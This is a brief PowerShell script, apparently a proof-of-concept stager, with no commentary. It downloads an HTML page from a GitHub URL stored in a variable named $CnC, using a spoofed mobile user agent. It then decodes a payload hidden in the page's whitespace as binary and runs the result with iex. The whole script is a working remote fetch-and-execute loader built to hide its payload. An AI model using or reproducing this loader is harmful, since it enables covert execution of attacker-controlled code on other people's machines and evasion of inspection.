$CnC = "https://raw.githubusercontent.com/ephreet/html-ninja/master/macro_poc.htm"; $pch = "nil"; $b = ""; $ch = ""
foreach ($cu in (Invoke-WebRequest $CnC -UserAgent "Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0").ToString().tocharArray()) {$ch = $cu;if ($pch -eq " "){if ($ch -eq " "){$b = $b + "1"; $ch = "nil"}else{$b = $b + "0";$ch = "nil"}};$pch = $ch}$c = ""
($b -split '(\w{8})' | ? {$_}) | ForEach-Object {$c = $c + [convert]::Tochar([System.Convert]::ToByte($_,2))};iex $c
